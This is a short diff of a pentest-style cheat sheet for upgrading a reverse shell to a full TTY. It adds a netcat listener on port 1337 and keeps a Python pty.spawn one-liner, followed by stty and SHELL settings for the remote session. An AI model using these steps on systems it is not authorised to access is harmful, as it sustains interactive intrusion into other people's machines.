@@ -1,15 +1,14 @@
 # Upgrade Reverse to tty
-# install pty,tty from python/ftp
-python -c 'import pty; pty.spawn("/bin/bash")'
 
-#Ctrl + Z in Host Shell
 stty raw -echo
-
-#switch to remote
-fg
+# connect
+nc -l 1337
 
 # install pty,tty from python/ftp
 python -c 'import pty; pty.spawn("/bin/bash")'
 
 #execute on remote
 export SHELL=bash
+
+#set size
+stty rows 33 columns 173
